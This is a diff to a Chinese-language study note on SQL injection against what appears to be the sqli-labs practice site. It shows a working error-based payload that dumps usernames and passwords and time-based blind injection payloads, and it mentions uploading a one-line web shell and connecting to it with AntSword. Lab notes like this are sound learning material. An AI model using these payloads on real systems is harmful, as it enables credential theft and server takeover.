@@ -69,3 +69,45 @@ http://172.28.72.167/Less-5/?id=1' and 1=extractvalue(1,concat(0x7e,(select grou
 ```sql
 http://172.28.72.167/Less-5/?id=1' and 1=extractvalue(1,concat(0x7e,(select group_concat(username,'~',password) from users )))--+
 ```
+
+## 布尔盲注
+
+![1686753102842](image/SQL/1686753102842.png)
+
+![1686753129610](image/SQL/1686753129610.png)
+
+## 时间盲注
+
+![1686754378352](image/SQL/1686754378352.png)
+
+```sql
+1.http://172.28.72.167/Less-9/?id=1' and if(ascii(substr((select  database()),1,1))=115,sleep(0),sleep(3)) --+  //115=s
+2.http://172.28.72.167/Less-9/?id=1' and if(ascii(substr((select  database()),2,1))=101,sleep(0),sleep(3)) --+  //101=e
+//重复判断得到数据库名称为 security
+```
+
+![1686755732542](image/SQL/1686755732542.png)
+
+![1686755755740](image/SQL/1686755755740.png)
+
+## SQL注入文件上传
+
+![1686756069227](image/SQL/1686756069227.png)
+
+![1686756340257](image/SQL/1686756340257.png)
+
+![1686796376297](image/SQL/1686796376297.png)
+
+> 一句话木马上传后使用蚁剑连接
+
+## POST注入
+
+![1686802321843](image/SQL/1686802321843.png)
+
+![1686802337256](image/SQL/1686802337256.png)
+
+![1686802379810](image/SQL/1686802379810.png)
+
+![1686802397097](image/SQL/1686802397097.png)
+
+![1686802413813](image/SQL/1686802413813.png)
